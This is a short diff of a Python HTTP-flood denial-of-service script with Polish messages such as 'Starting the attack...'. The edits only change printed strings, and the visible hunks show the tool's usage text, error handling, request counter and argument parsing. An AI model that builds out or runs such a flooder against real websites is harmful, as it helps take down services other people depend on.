@@ -61,8 +61,8 @@ def buildblock(size):
 
 def usage():
 	print ' '
-	print '• Zle uzycie!'
-	print '• Poprawne: httpflood.py <url>'
+	print '  Zle uzycie!'
+	print '  Poprawne: httpflood.py <url>'
 	print ' '
 
 	
@@ -88,7 +88,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print '• Strona ponawia próbę...'
+			print '  Strona ponawia próbę łączenia...'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -119,7 +119,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n• Rozpoczynanie atakowania..."
+			print "\n  Rozpoczynanie atakowania..."
 
 #execute 
 if len(sys.argv) < 2:
@@ -130,7 +130,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "• Ataowanie strony..."
+		print "  Ataowanie strony..."
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
